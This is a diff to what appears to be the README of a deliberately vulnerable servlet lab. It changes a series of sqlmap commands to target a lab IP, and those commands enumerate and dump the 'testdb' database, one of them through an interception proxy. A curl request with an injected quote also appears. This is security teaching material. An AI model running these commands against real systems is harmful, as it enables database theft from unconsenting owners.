@@ -22,21 +22,23 @@ $ curl -i -X GET "http://localhost:8080/Servlet-Search/controller?username=%27+O
 
 How to use sqlmap to attack this Web application?
 -------------------------------------------------------------------------------
-$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search"
+Here we use sqlmap from Kali Linux:
+
+$ sqlmap -u "http://10.0.2.7:8080/Servlet-Search/controller?username=Simpson&action=Search"
 		
-$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" --tables
+$ sqlmap -u "http://10.0.2.7:8080/Servlet-Search/controller?username=Simpson&action=Search" --tables
 		
-$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --columns
+$ sqlmap -u "http://10.0.2.7:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --columns
 
-$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --schema
+$ sqlmap -u "http://10.0.2.7:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --schema
 
-$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --count
+$ sqlmap -u "http://10.0.2.7:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --count
 
-$ ./sqlmap.py -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump
+$ sqlmap -u "http://10.0.2.7:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump
 
 If we need want to use an interception proxy, we type:
 
-$ ./sqlmap.py --proxy=http://localhost:8010 -u "http://localhost:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump
+$ sqlmap --proxy=http://localhost:8010 -u "http://10.0.2.7:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump
 
 Database: testdb
 Table: user
